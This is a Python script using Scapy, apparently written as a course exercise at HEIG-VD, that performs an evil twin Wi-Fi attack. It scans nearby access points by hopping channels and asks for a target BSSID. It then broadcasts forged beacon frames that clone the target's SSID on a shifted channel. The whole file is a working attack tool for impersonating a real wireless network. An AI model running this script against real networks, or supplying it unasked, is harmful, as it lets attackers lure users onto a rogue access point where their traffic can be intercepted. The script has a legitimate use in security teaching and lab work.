#!/usr/bin/python3

from scapy.all import *
from threading import Thread
import pandas
import time
import os
import argparse
from uuid import getnode as get_mac
myMac = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)


def print_all():
    print(networks.iloc[:, 0:3])

def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        ch = ch % 13 + 1
        time.sleep(0.5)
        if endChange == 1:
            break

def fakeAccessPoint():
    # SSID (name of access point)
    # ssid = networks.at["1c:24:cd:43:29:70", "SSID"]
    ssid = attackSSIDName
    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=myMac, addr3=myMac)
    # beacon layer
    beacon = Dot11Beacon(cap="ESS+privacy")
    # putting ssid in the frame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    # stack all the layers and add a RadioTap
    frame = RadioTap() / dot11 / beacon / essid
    # send the frame in layer 2 every 100 milliseconds forever
    # using the `iface` interface
    sendp(frame, inter=0.1, iface=interface, loop=1, verbose=0)

if __name__ == "__main__":
    # check admin privileges
    if not os.getuid() == 0:
        print("Permission denied. Try running this script with sudo.")
        exit()    
    
    parser = argparse.ArgumentParser(
        description="Fake Channel Request Evil Twin Attack",
        epilog="This script was developped as an exercise for the SWI course at HEIG-VD")
        
    parser.add_argument("interface", help="Interface to use")
    args = parser.parse_args()

    # interface name, check using iwconfig
    interface = args.interface

    # start the channel changer
    endChange = 0
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # start sniffing
    print("Please, wait 10s...")
    sniff(prn=callback, iface=interface, timeout=10)
    print("Sniffing ended")
    print("list of avalaible SSID: ")
    print_all()
    endChange = 1
    channel_changer.join()

    # Select network to attack
    while True:
        bsidToAttack = input("ENTER THE BSSID TO ATTACK: ")
        if bsidToAttack in networks.index.values:
            print("yeah")
            break

    # Setting new attack
    attackSSIDName = networks.at[bsidToAttack, "SSID"]
    print("Attack of SSID: ", attackSSIDName)
    attackSSIDChanel = networks.at[bsidToAttack, "Channel"]
    print("Was on Channel: ", attackSSIDChanel)
    newChannel = (int(attackSSIDChanel) + 6) % 13 + 1
    print("Clone on Channel: ", newChannel)
    os.system(f"iwconfig {interface} channel {newChannel}")

    # Fake SSID Start
    fakeAP = Thread(target=fakeAccessPoint)
    fakeAP.daemon = True
    fakeAP.start()
    time.sleep(0.2)

    # start sniffing
    while True:
        print()
        print("Emptying list of SSID...")
        time.sleep(0.2)
        print()
        networks = networks.iloc[0:0]
        print("Wait 10s to see if your attack still works on Channel: ", newChannel)
        sniff(prn=callback, iface=interface, timeout=10)
        print()
        time.sleep(0.2)
        print_all()
        time.sleep(0.2)
        print()
        print("Even if you see N/A or none for channels and signals, it is still on the new channel because we're scannig it only")
